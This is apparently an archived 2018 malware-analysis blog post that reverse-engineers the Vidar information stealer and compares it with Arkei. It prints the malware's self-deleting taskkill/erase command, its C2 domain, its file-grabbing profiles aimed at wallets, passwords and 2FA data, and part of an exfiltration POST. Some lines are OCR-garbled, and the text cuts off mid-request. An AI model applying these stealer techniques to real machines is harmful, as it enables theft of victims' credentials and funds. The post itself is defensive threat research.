{
    "id": "36e87c5a-d393-4032-acc2-dd47ebe41efe",
    "created_at": "2023-01-12T15:01:53.119181Z",
    "updated_at": "2025-03-27T02:15:35.718388Z",
    "deleted_at": null,
    "sha1_hash": "fbea0a6c61d2d64221363688f74138efd59cea14",
    "title": "2018-12-24 - Let‚Äôs dig into Vidar ‚Äì An Arkei Copycat-Forked Stealer (In-depth analysis)",
    "authors": "",
    "file_creation_date": "2022-05-28T01:20:41Z",
    "file_modification_date": "2022-05-28T01:20:41Z",
    "file_size": 5272232,
    "plain_text": "# Let‚Äôs dig into Vidar ‚Äì An Arkei Copycat/Forked Stealer (In-depth analysis)\n\n**[fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/](https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/)**\n\nfumko December 24, 2018\n\nSometimes when you are reading tons and tons of log of malware analysis, you are not expecting that some little changes could be in fact\nimpactful.\n\nI paid the price when I was analyzing a supposed Arkei malware. my Yara rule at that time was supposed to trigger this malware, but after\nsome reversing, I realized that I was confronted with something different. Some strings linked to Arkei signature was deleted and a new one\nappeared with the string ‚ÄúVidar‚Äù, there are also some other tweaks in the in-depth analysis that proves there are some differences (but small),\nbut all the rest was totally identical to Arkei.\n\nThe malware is written in C++, seems to have started activities at the beginning of October 2018 and have all the kind of classic features of\nstealers:\n\nSearching for specific documents\nStealing ID from cookie browsers\nStealing browser histories (also from tor browser)\nStealing wallets\n**_Stealing data from 2FA software_**\n\n\n-----\n\nG abb g essage o esse ge so t a e\nScreenshot\nLoader settings\nTelegram notifications (on server-side)\nGet a complete snapshot of all information of the computer victim\n\nSold with a range of 250-700$, this stealer on shop/forums and when people buy it, they have access to a C2 Shop portal where they are able\nto generate their own payloads. So there is no management on their side. Also, domains who leads to the C2/Shop are changed every 4 days.\n\nFor this in-depth analysis, I will inspect the 4.1 version of Vidar, take an overview of the admin panel, catching the differences with Arkei.\n\n## Basic Countries by-passing\n\nSo first of all, we have some classic pattern to quit the program if the victim machines are configured in some language with the help of\n[GetUserDefaultLocaleName. This is one of the easy tricks to check if the malware is not infected users from specific countries.](https://docs.microsoft.com/en-us/windows/desktop/api/winnls/nf-winnls-getuserdefaultlocalename)\n\nAs explained in the MSDN, A ‚Äúlocale‚Äù is a collection of language-related user preference information represented as a list of values, the stealer\nwill check if the language is corresponding with the list of countries that mentioned below.\n\nWith a few seconds of searching on google, it‚Äôs easy to understand which countries are behind the locale names :\n\nLocale Country\n\nru-RU Russia\n\n\n-----\n\nbe-BY Belarus\n\nuz-UZ Uzbekistan\n\nkk-KZ Kazhakstan\n\naz-AZ Azerbaijan\n\nLCID Structure ‚Äì [https://msdn.microsoft.com/en-us/library/cc233968.aspx](https://msdn.microsoft.com/en-us/library/cc233968.aspx)\n\nLanguage Code Table ‚Äì [http://www.lingoes.net/en/translator/langcode.htm](http://www.lingoes.net/en/translator/langcode.htm)\n\n[LocaleName ‚Äì https://docs.microsoft.com/fr-fr/windows/desktop/Intl/locale-names](https://docs.microsoft.com/fr-fr/windows/desktop/Intl/locale-names)\n\n[Locale ‚Äì https://docs.microsoft.com/fr-fr/windows/desktop/Intl/locales-and-languages](https://docs.microsoft.com/fr-fr/windows/desktop/Intl/locales-and-languages)\n\n## Mutex generation\n\nThe mutant string generated by Vidar is unique for each victim, but simple to understand how it is generated. This is just a concatenation of\ntwo strings :\n\nHardware Profile ID\n\n[GetCurrentHwProfileA is used to retrieve the current hardware profile of the computer with the value of szHwProfileGuid. If it fails, it will return](https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-getcurrenthwprofilea)\n‚ÄúUnknown‚Äù here.\n\nThe Machine GUID\n\nWith the help of [RegOpenKeyExA, the value of the registry key is fetched:](https://docs.microsoft.com/en-us/windows/desktop/api/winreg/nf-winreg-regopenkeyexa)\n```\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid\n\n```\nThis is the [UUID created by Windows during the installation of the operating system.](https://msdn.microsoft.com/en-us/library/windows/desktop/aa379358(v=vs.85).aspx)\n\n\n-----\n\ne t s do e, t e ute s c eated, just e t s\n\n## String setup\n\nWhen Vidar is entering in the main function, it needs to store some required strings to be able to work properly for some further steps.\n\nAll the RVA address of each string are stored in the .data section. The malware will go there to access to the requested string.\n\nThis is a trick to slow down the static analysis of the malware, but this is really easy to surpass üôÇ\n\n## C2 Domain & Profile ID\n\nWhen the malware is generated by the builder on the customer area. A unique ID is hardcoded into it. When Vidar will request this value on\nthe malicious domain, it will retrieve the corresponding profile that the threat actor wants to grab/steal into the victim machine.\n\nSo on this case, this the profile ID is ‚Äú178‚Äù. If there is no config on the malware, the profile ID ‚Äú1‚Äù is hardcoded into it.\n\n\n-----\n\nThe C2 domain is a simple XORed string, the key is directly put into the XOR function to decrypt the data.\n\nAnd decrypted it‚Äôs in fact ‚Äúnewagenias.com‚Äù\n\n[Configs are possible to be extracted easily with the script izanami.py on my GitHub repository.](https://github.com/Fmk0/scripts/blob/master/izanami.py)\n\n## How to understand the config format\n\nFor example, this is default configuration the malware could get from the C2 :\n\n\n-----\n\n_,,,,,,,,,, 50, e au t;%_ _S_ _O %\\; t t_ _dat_ _a et_ _a_ _bac up_ _code_ _pass o d_ _aut_ _goog e_ _utc_ _U C_ _c yp_\n\nEach part have the ‚Äú;‚Äù in delimiter, so let‚Äôs dig into it\n\nFirst part\n\n1 Saved password\n\n1 Cookies / AutoFill\n\n1 Wallet\n\n1 Internet History\n\n1 ??? ‚Äì Supposed to be Skype (not implemented)\n\n1 ??? ‚Äì Supposed to be Steam (not implemented)\n\n1 Telegram\n\n1 Screenshot\n\n1 Grabber\n\n1 ???\n\n250 Max Size (kb)\n\nDefault Name of the profile (also used for archive file into the files repository)\n\nSecond part\n\n%DESKTOP % Selected folder repository where the grabber feature will search recursively (or not) some selected data\n\nThird part\n\n**_*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*:*key*.*_**\n\nFourth part\n\n50 Max Size per file (kb)\n\ntrue Collect Recursively\n\nFifth part:\n\n**_movies:music:mp3;_**\n\nThis is the exception part, the grabber will avoid those strings if it matches in the files searched recursively in the specific wanted folder.\n\nThe setup is quite a mess if we are looking into the code. each option is stored into a byte or dword variable.\n\n\n-----\n\n## Folder generation\n\nTo summarize all kind of possibles files/folders that will be generated for the malicious repository is in fact pretty simple :\n```\n\\\\files          <- Master folder\n\\\\files\\\\Autofill     <- Auto-Fill files\n\\\\files\\\\CC        <- Credit Cards\n\\\\files\\\\Cookies     <- Cookies\n\\\\files\\\\Downloads    <- Downloaded data history from browsers\n\\\\files\\\\Files      <- Profile configs (Archives)\n\\\\files\\\\History     <- Browser histories\n\\\\files\\\\Soft       <- Master folder for targeted softwares\n\\\\files\\\\Soft\\\\Authy   <- 2FA software\n\\\\files\\\\Telegram     <- Telegram messages\n\\\\files\\\\Wallets     <- Cryptomining Wallets\n\n```\nGeneralist files\n```\n\\\\files\\screenshot.jpg   <- Actual screenshot of the screen\n\\\\files\\passwords.txt   <- Passwords consolidated all at once\n\\\\files\\\\information.txt  <- Snapshot of the computer setup\n\n## Libraries necessary to grab some data\n\n```\nSomething that I love when I read some malware specs, it‚Äôs when they said that the product could be launched without the necessity to have\nsome runtime libraries or other required software on the machine. But when you dig into the code or just watching some network flow, you can\nsee that the malware is downloading some DLL to be able to do some tasks.\n\n\n-----\n\nAnd for this case, they are required during the stealing process of different kind of browsers.\n\nfreebl3.dll Freebl Library for the NSS (Mozilla Browser)\n\nmozglue.dll Mozilla Browser Library\n\nmsvcp140.dll Visual C++ Runtime 2015\n\nnss3.dll Network System Services Library (Mozilla Browser)\n\nsoftokn3.dll Mozilla Browser Library\n\nvcruntime140.dll Visual C++ Runtime 2015\n\nThey are deleted when the task is done.\n\n## FTP\n\nList of supported software\n\nFileZilla\nWinSCP\n\n## 2FA software\n\nSomething that I found interesting on this malware is that also 2FA software is also targeted, a feature that I considered not seen really in the\nwild, and pretty sure this will be more and more common in the future. With the multiplication of those kinds of protection. Victims must\nunderstand that 2FA is not the ultimate way to protect accounts from hackers, this could be also another door for vulnerabilities üôÇ\n\nSo with Vidar, the Authy software is targeted‚Ä¶\n\n\n-----\n\nMore specifically the SQLite file on the corresponding application on %APPDATA% repository. It looks like this is the same operating where\nstealer wants to steal data with software like Discord or Chrome.\n\nSo guys, be careful with your 2FA software üôÇ\n\n## Browsers\n\nSomething interesting to mention, this bad boy is also stealing Tor Browser stuff.\n\n\n-----\n\nst o suppo ted o se s\n\n360 Browser\nAmigo\nBlackHawk\nCent Browser\nChedot Browser\nChromium\nCocCoc\nComodo Dragon\nCyberfox\nElements Browser\nEpic Privacy\nGoogle Chrome\nIceCat\nInternet Explorer\nK-Meleon\nKometa\nMaxthon5\nMicrosoft Edge\nMozilla Firefox\nMustang Browser\nNichrome\nOpera\nOrbitum\nPale Moon\nQIP Surf\nQQ Browser\nSputnik\nSuhba Browser\nTor Browser\nTorch\nURAN\nVivaldi\nWaterfox\n\nOf course, this list could be more important than this if there are some browsers based on chromium repository.\n\n## Messengers/Mailer\n\n[I will not explain here, how it works, but the technique is the same that I‚Äôve explained in my previous blog post. (Especially for the Telegram](https://fumik0.com/2018/10/15/predator-the-thief-in-depth-analysis-v2-3-5/)\npart).\n\nBat!\nPidgin\nTelegram\nThunderbird\n\n## Wallets\n\nAnoncoin\nBBQCoin\nBitcoin\nDashCore\nDevCoin\nDigitalCoin\nElectron Cash\nElectrumLTC\nEthereum\nExodus\nFlorinCoin\nFrancoCoin\nJAXX\nLitecoin\nMultiDoge\n\n\n-----\n\ne aCo\nYACoin\nZcash\n\nOf course, this list could change if the customer added some additional files to search on specific areas on the victim machine.\n\n## Grabber\n\nThe grabber feature is by far, the most complicated feature of the malware and what he looks to be really different from Arkei, in term of\nimplementation.\n\nSo first of all, it will skip or not the grabber feature by checking in config file downloaded, if this is activated. Preparing the strings for creating\nthe folder path and when all is set func_grabber could be used.\n\nWhen inspecting the func_grabber, I was not prepared to have this :\n\n\n-----\n\nBy far, when I saw this, I was not really happy to reverse this. I mean, I know I was falling in some unexpected allocated memory into my brain.\nI had all the magnificent stuff that all malware reverser love (or not at all) :\n\nWeird conditions come out the blue.\nCalling function that will call other functions like Russian wooden dolls\nAPI calls\netc‚Ä¶\n\nBut if we are watching these at a macro view, it‚Äôs, in fact, easier than it looks like. I will just show just one example.\n\nSo in the example below, if the string %APPDATA% is present in the config downloaded from the C2. it will enter into the function and will start\na bunch of verifications. Until entering into the most important one called func_VidarSearchFile\n\n\n-----\n\nAfter the process will remain almost the same for each scenario.\n\nThis is at least, all the repositories available in the grabber feature :\n\n[%ALL_DRIVES% (GetDriveTypeA Necessary)](https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-getdrivetypea)\n%APPDATA%\n%C%\n%D%\n%DESKTOP%\n%DOCUMENTS%\n%DRIVE_FIXED%\n%DRIVE_REMOVABLE%\n%LOCALAPPDATA%\n%USERPROFILE%\n\n## Screenshot\n\nThe generation of the screenshot is easy to understand :\n\nFirst [GdiplusStartup function is called to initialize the Windows GDI+](https://docs.microsoft.com/en-us/windows/desktop/api/gdiplusinit/nf-gdiplusinit-gdiplusstartup)\nThen an alternative to GetDeviceCaps is called for getting the height of the screen on the display monitor with the value SM_CYSCREEN\n(1) with [GetSystemMetrics this will be the same thing with SM_CXSCREEN (0) for the width.](https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getsystemmetrics)\n\n\n-----\n\nNow, it needs a DC object for creating a compatible bitmap necessary to generate our image by selecting the windows DC into the\ncompatible memory DC and using a Bit Block API function to transfer the data. When all is done, it will enter into\n**_func_GdipSaveImageToFile_**\n\nSo now its needed to collect the bits from the generated bitmap and copies them into a buffer that will generate the screen capture file.\n\n## Information Log\n\nSo let‚Äôs dig into information.txt, to understand how this file is generated. I will mention only some parts of the creation, another part will be just\nthe corresponded API call, breakpoint on these API if you want to take your time to analyze all the step easily.\n\n\n-----\n\nst, t d cates c e s o o da s used\n\n_If you don‚Äôt see a Vidar on the log file. It means that you have an early version of it._\n\nDate [GetSystemTimeAsFileTime](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemtimeasfiletime)\n\nMachineID Explained Above\n\nGUID [GetCurrentHwProfileA](https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-getcurrenthwprofilea)\n\nPath [GetModuleFileNameExA](https://docs.microsoft.com/en-us/windows/desktop/api/psapi/nf-psapi-getmodulefilenameexa)\n\nWork Dir Hardcoded string + func_FolderNameGeneration\n\nGet the name of the operating system and platform is classic because this is, in fact, a concatenation of two things. First,\nwith [RegOpenKeyExA, the value of this registry key is fetched:](https://docs.microsoft.com/en-us/windows/desktop/api/winreg/nf-winreg-regopenkeyexa)\n```\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName\n\n```\n[Secondly, for knowing if Windows is 32 or 64-bit, it checks itself if is running on WOW64 with the help of IsWow64Process.](https://docs.microsoft.com/fr-fr/windows/desktop/WinProg64/running-32-bit-applications)\n\nComputer Name [GetComputerNameA](https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-getcomputernamea)\n\nUser Name [GetUserNameA](https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-getusernamea)\n\n[For the current screen resolution used, CreateDCA is called to create a device context for ‚ÄúDisplay‚Äù and requesting the Width and Height of the](https://docs.microsoft.com/en-us/windows/desktop/api/wingdi/nf-wingdi-createdca)\n[Device with GetDeviceCaps.](https://docs.microsoft.com/en-us/windows/desktop/api/wingdi/nf-wingdi-getdevicecaps)\n\n\n-----\n\nThis remains to this source code :\n```\nHDC hDC = CreateDCA(\"DISPLAY\", NULL, NULL, NULL); \nint width = GetDeviceCaps(hDC, HORZRES); // HORZRES = 0x8\nint height = GetDeviceCaps(hDC, VERTRES); // VERTRES = 0x0A\n\n```\nLet‚Äôs continue our in-depth analysis‚Ä¶\n\nDisplay Language [GetUserDefaultLocaleName](https://docs.microsoft.com/en-us/windows/desktop/api/winnls/nf-winnls-getuserdefaultlocalename)\n\nKeyboard Languages [GetKeyboardLayoutList /](https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getkeyboardlayoutlist) [GetLocaleInfoA](https://docs.microsoft.com/en-us/windows/desktop/api/winnls/nf-winnls-getlocaleinfoa)\n\nLocal Time [GetSystemTimeAsFileTime](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemtimeasfiletime)\n\nTimeZone [TzSpecificLocalTimeToSystemTime](https://docs.microsoft.com/en-us/windows/desktop/api/timezoneapi/nf-timezoneapi-tzspecificlocaltimetosystemtime)\n\n**_Hardware_**\n\n??? the process name, the value of the registry key is fetched:\n```\nHKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\ProcessorNameString\n\n```\nCPU Count [GetSystemInfo.dwNumberOfProcessors](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/ns-sysinfoapi-_system_info)\n\nRAM [GlobalMemoryStatusEx](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-globalmemorystatusex)\n\nVideoCard [EnumDisplayDevicesW](https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-enumdisplaydevicesa)\n\n**_Network_**\n\nThe network part is quite easy, it‚Äôs a translation of data retrieves on ip-api.com/line/ and put into the log, at the corresponding place.\n\n\n-----\n\n**_ocesses_**\n\nThere is quite soft stuff done to get a snapshot of all the processes at the time where the stealer is executed.\n\nBut in the end, this is not complicated at all to understand the different steps.\n\nRequest [CreateToolhelp32Snapshot, to get the complete snapshot of all the processes executed, and read one per one in a loop all with](https://docs.microsoft.com/en-us/windows/desktop/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)\n[Process32First](https://docs.microsoft.com/en-us/windows/desktop/api/tlhelp32/nf-tlhelp32-process32first)\n\n\n-----\n\n[After, checking if it‚Äôs a parent process or a child process, Vidar will grab two value of the PROCESSENTRY32 object :](https://docs.microsoft.com/fr-fr/windows/desktop/api/tlhelp32/ns-tlhelp32-tagprocessentry32)\n\nth32ProcessID: PID\nszExeFile: The name of the PE\n\n**_Software_**\n\nFor the list of all installed software, the value of this registry key is fetched:\n```\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\n\n```\nAnd these values are retrieves of each software.\n\nDisplayName\nDisplayVersion\n\n\n-----\n\n**_Results_**\n\nSo for example, if you want to see the results, let‚Äôs see into [one sandbox analysis, the generated information.txt (this is a Vidar 4.2 here)](https://app.any.run/tasks/b439a1fd-fb62-4451-b9d4-d4a4597e3dfd)\n\n\n-----\n\n```\nDate: Thu Dec 13 14:39:05 2018\nMachineID: 90059c37-1320-41a4-b58d-2b75a9850d2f\nGUID: {e29ac6c0-7037-11de-816d-806e6f6e6963}\nPath: C:\\Users\\admin\\AppData\\Local\\Temp\\toto.exe \nWork Dir: C:\\ProgramData\\LDGQ3MM434V3HGAR2ZUK\nWindows: Windows 7 Professional [x86]\nComputer Name: USER-PC\nUser Name: admin\nDisplay Resolution: 1280x720\nDisplay Language: en-US\nKeyboard Languages: English (United States)\nLocal Time: 13/12/2018 14:39:5\nTimeZone: UTC-0\n[Hardware]\nProcessor: Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz\nCPU Count: 4\nRAM: 3583 MB\nVideoCard: Standard VGA Graphics Adapter\n[Network]\nIP: 185.230.125.140\nCountry: Switzerland (CH)\nCity: Zurich (Zurich)\nZIP: 8010\nCoordinates: 47.3769,8.54169\nISP: M247 Ltd (M247 Ltd)\n[Processes]\n- System [4]\n---------- smss.exe [264]\n- csrss.exe [344]\n< ... >\n[Software]\nAdobe Flash Player 26 ActiveX [26.0.0.131]\nAdobe Flash Player 26 NPAPI [26.0.0.131]\nAdobe Flash Player 26 PPAPI [26.0.0.131]\n< ... >\n\n## Loader\n\n```\nThe task is rudimentary but enough to do the job :\n\nGenerating a random name for the downloaded payload\nDownload the payload\nExecute\n\n\n-----\n\nWhen the binary file is downloaded from the C2, it‚Äôs using [CreateFileA with specific parameters :](https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-createfilea)\n\n**_edi : The downloaded data from the C2_**\n**_80h : ‚ÄúThe file does not have other attributes set. This attribute is valid only if used alone.‚Äù_**\n**_2 : This option will force the overwriting if the filename already exists._**\n**_edi : ???_**\n**_1 : ‚ÄúEnables subsequent open operations on a file or device to request read access.‚Äù_**\n_Otherwise, other processes cannot open the file or device if they request read access.‚Äù_\n\n**_40000000h : Write access (GENERIC_WRITE)_**\n**_ebp+lpFileName : The generated filename_**\n\nWhen it‚Äôs done, it only needs to Write content into the files (WriteFile) and then close the corresponding handle (CloseHandle)\n\n\n-----\n\nSo o, t e e s do oaded a d sa ed to t e d s, t o y eeds to be au c ed t S e ecute So do t es tate to b ea po t t s\nAPI function, for grabbing the payload before it‚Äôs too late for further analysis.\n\n## Killing Part\n\n[So when all the task of the stealer is finally accomplished and cleaned, the stealer needs to erase itself. So first of all, it retrieves this own PID](https://en.wikipedia.org/wiki/Process_identifier)\nwith the help of [GetCurrentProcessId.](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-getcurrentprocessid)\n\n[When it‚Äôs done, it enters into ‚Äúfunc_GetProcessIdName‚Äù, tries to open a handle on his own process with OpenProcess, if it failed, it continues](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess)\n[to check and in the end the most important task here is to call GetModuleBaseNameA, which it permits to retrieve the name of the process](https://docs.microsoft.com/en-us/windows/desktop/api/psapi/nf-psapi-getmodulebasenamea)\nname with the help of the PID that was obtained before.\n\nSome strings that are hardcoded on .rdata section are called and saved for future purposes.\n\n\n-----\n\n[When the request is finely crafted, Vidar is simply using ShellExecuteA to pop a command shell and executing the task, this permit to erase all](https://docs.microsoft.com/en-us/windows/desktop/api/shellapi/nf-shellapi-shellexecutea)\ntrace of the interaction of the payload on the machine.\n\nSo if we want a quick overview of the executed command:\n\n_C:\\Windows\\System32\\cmd.exe‚Äù /c taskkill /im vidar.exe /f & erase C:\\Users\\Pouet\\AppData\\Local\\Temp\\vidar.exe & exit_\n\nLiterally:\n\n**_Offset File + db_** **‚Äò/c taskkill /im‚Äô + [GetModuleBaseNameA] + db** **‚Äò /f & erase‚Äô + [GetModuleFileNameExA + GetModuleBaseNameA]+**\n+ db **‚Äò & exit‚Äô**\n\n## Sending archive to the C2\n\n**Folder generation**\n\nCOUNTRY + ‚Äú_‚Äù + Machine GUID + ‚Äú.zip‚Äù\n\nin example :\n\nNG_d6836847-acf3-4cee-945d-10c9982b53d1.zip\n\n**Last POST request**\n\nDuring the generation of the POST request, the generated HTTP packet is tweaked to add some additional content that the C2 server will read\nand process data.\n\nEach name at the end of the string will be the corresponding field to be saved into the database. This at least, all the different ContentDisposition that will be added to the HTTP request.\n\nhwid Hardware ID\n\nos Operating System\n\nplatform 32 or 64 bits System\n\nprofile C2 Profile ID\n\nuser Name of the victim account\n\n\n-----\n\ncccount Number of Credit Cards stolen\n\nccount Number of Coins Stolen (CryptoWallet)\n\nfcount Number of files stolen\n\ntelegram Telegram üôÇ\n\nver The version of the Vidar malware\n\nAlso, there is a little trick here that I found nice. Here, the answer to the POST request is in fact, containing the config for the loader.\n\nIf there is nothing, the response is ‚Äúok‚Äù\nIf there is something, the specified url(s) are stored.\n\nIts the same thing used for the config and the network information.\n\nExample with a sandbox :\n\nThe POST request\n\nThe response of this POST request (select the tab)\n\n\n-----\n\n## Server-Side\n\nBecause it‚Äôs easy to find some information about the stealer, no needs to dig hard to have some marketplace where Vidar is sold. So let‚Äôs see\nhow it looks like by looking some classical commercial video (all the screenshot are collected from there), for attracting some possible\ncustomers. This could be completely different at that time, but it‚Äôs what it was looking like at the beginning of November.\n\n**_Login_**\n\n**_Dashboard_**\n\nThe panel is a classical fancy user-friendly interface, with all the basic information necessary for the customer to have a fast view how is goin‚Äô\nhis business.\n\nThe current version of the builder\nUntil when he is able to generate some payloads\nHow many victims\nThe current balance on his account to re-subscribe again\n\n\n-----\n\n**_Logs_**\n\nsomething to mention with the log part is that it‚Äôs possible to put some notes on each data.\n\n**_Passwords_**\n\n**_Builder_**\n\nThe builder tab is also pretty interesting because we have the changelog information about the stealer and on the download part, the malware\ngenerated will not be packed and this is the same scenario with Arkei.\n\nCustomer/Threat actor must have to use his own crypter/packer software for his payload.\n\n\n-----\n\n**_Settings_**\n\nThe most important tab is obviously where it is possible to configure the payload, for grabbing some additional stuff on the machine with the\nprofiles. Activate or deactivate some features to filtering the stealer for really specific purposes.\n\nIt‚Äôs also important to notify, that it‚Äôs possible with Vidar to deploy multiple profiles at the same time. It means when the payload is infecting the\nvictim machine, X archive for X profile is saved in ‚Äúfiles‚Äù repository. The customer could be able to sort easily for malicious purposes after the\ngrabbed data.\n\nWhen editing or creating a new rule, we have this prompt panel appearing and this is in relation with what explained above with all possible\npath that the malware is able to search with the selected files.\n\n\n-----\n\nAfter checking a little, there is plenty of profiles on the C2. This is what we could found:\n\nDefault empty config:\n```\n1,1,1,1,1,1,1,1,0,1,250,none;\n\n```\nDefault initialized config:\n```\n1,1,1,1,1,1,1,1,1,1,250,Default;%DESKTOP%\\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*\n\n```\nExamples of custom profiles:\n```\n1,1,1,1,1,1,1,1,1,1,250,grabba;%DESKTOP%\\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.\n1,1,0,1,1,1,1,1,1,1,250,–∏–Ω—Ñ–∞;%DESKTOP%\\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:\n1,1,1,1,1,1,1,1,1,1,250,–ü–µ—Ä–≤–æ–µ;%DESKTOP%\\;*.txt:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*;50;true;movies:music:mp3;\n1,1,1,1,1,1,1,1,1,1,250,123435566;%DESKTOP%\\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*ut\n1,1,1,1,1,1,1,1,1,1,250,Default;%DESKTOP%\\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*\n\n```\nThere are also some possibilities to see multiple profiles executed at the same time.\n```\n1,1,1,1,1,1,0,1,1,1,250,\nDESKTOP;%DESKTOP%\\;*.txt:*.dat:*wallet*.*:*2fa*.*:*2fa*.png:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*cr\nDOCUMENTS;%DOCUMENTS%\\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*.*:*crypt*.*\nDRIVE_REMOVABLE;%DRIVE_REMOVABLE%\\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*\n\n```\nthey are in fact Delimited with the specific format, as detailed as above. So here, we have 3 profiles :\n\nDESKTOP\nDOCUMENTS\nDRIVE_REMOVABLE\n\nthat will be stored into there respectively archives into ‚Äúfiles‚Äù repository.\n\n_[e.d: All dumped profiles are available on my GitHub repository.](https://github.com/Fmk0/work/tree/master/Vidar)_\n\nFinally, with this quick analysis of the panel, something that is more and more common nowadays with a stealer, a loader feature, for pushing\nother malware.\n\n\n-----\n\ns e t o ed t e t oduct o, t s s a s op e e custo e s just a e to dea to co gu e t e a a e, e e yt g s a aged by a\nteam (?) behind for the maintenance and for avoiding proxy filtering stuff, domains are changed regularly (it‚Äôs also easy to check this on the\nsamples, because it looks like a new version means a new generated domain).\n\nAlso, there is some possibility (of what they said) to have a 2FA Authentication to their account page.\n\n### Some fancy message\n\nif we are searching for some stuff with the login panel, with have some sympathetic message.\n\nLet‚Äôs see what we have behind üôÇ\n\n\n-----\n\nA kind of easter egg to remind us what is the signification of Vidar: ‚Äúthe God of Vengeance‚Äù in Nordic mythology.\n\n## Vidar ‚Äì An Arkei copycat?\n\nIf we are looking to requests and code, Vidar is almost identical to Arkei. There is slightly some differences at some point but all implemented\nfeatures are the same. This could lose some blue team people if they don‚Äôt make too much attention to it on sandbox results. Current Yara\nrules will trigger Vidar as Arkei, so automated assignations lead to mistakes at the moment of this review. Analyzing the code is mandatory\nhere to understand what‚Äôs goin‚Äô on.\n\nAt first, the main function for both of them is similar :\n\n\n-----\n\nThe archive generation is also the same, so this is not with this information that it‚Äôs possible to differentiate these two malware.\n\n### Code differences\n\nAn easy to know if we are dealing with Vidar is to find ‚ÄúVidar.cpp‚Äù.\n\n**_Vidar Signature_**\n\n\n-----\n\n**_Arkei signature_**\n\n### Network differences\n\nAn analyst can be dupe easily with the requests and thinking that we have another form of HTTP requests with Arkei, but it‚Äôs not.\n\n**_Vidar HTTP Requests_**\n```\n/ (i.e 162)  <- Config\nip-api.com/line/  <- Get Network Info\n/msvcp140.dll    <- Required DLL\n/nss3.dll      <- Required DLL\n/softokn3.dll    <- Required DLL\n/vcruntime140.dll  <- Required DLL\n/          <- Pushing Victim Archive to C2\n\n```\nthere are no libraries downloaded on Arkei, this is something really specific to Vidar, for some parts of the stealing process.\n\n**_Arkei HTTP Requests_**\n```\n/index.php    <- Config\nip-api.com/line/ <- Get Network Info\n/index.php    <- Pushing Victim Archive to C2\n\n```\n**_Config Format_**\n\n\n-----\n\nIf you want to understand what is the purpose the config format for Arkei\n\n1 Saved Passwords\n\n1 Cookies / Autofill\n\n1 History\n\n2 CryptoCurrency\n\n2 Skype\n\n2 Steam\n\n1 Telegram\n\n1 Screenshot\n\n1 Grabber\n\ntxt:log: Grabber Config\n\n50 Max Size (kb)\n\n2 Self Delete\n\nAlso, there are some slight changes in the last POST requests, Vidar is just adding new fields like the profile and the versioning.\n\nTo understand how far the requests looks the same, let‚Äôs dig into a PCAP file. I indicated the differences in red, and apart from the versioning\nand profile values, all rest is the same. But if we dig into some older sample, it‚Äôs impossible to see the differences except the path of the\nrequest.\n\n**_Last POST request ‚Äì Vidar_**\n\n\n-----\n\n```\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\nContent-Length: 66809\nHost: some.lovely.vidar.c2.with.love\nConnection: Keep-Alive\nCache-Control: no-cache\n--1BEF0A57BE110FD467A\nContent-Disposition: form-data; name=\"hwid\"\n90059c37-1320-41a4-b58d-2b75a9850d2f\n--1BEF0A57BE110FD467A\nContent-Disposition: form-data; name=\"os\"\nWindows 7 Professional\n--1BEF0A57BE110FD467A\nContent-Disposition: form-data; name=\"platform\"\nx86\n--1BEF0A57BE110FD467A\nContent-Disposition: form-data; name=\"profile\"\nXXX <- Random Int\n--1BEF0A57BE110FD467A\nContent-Disposition: form-data; 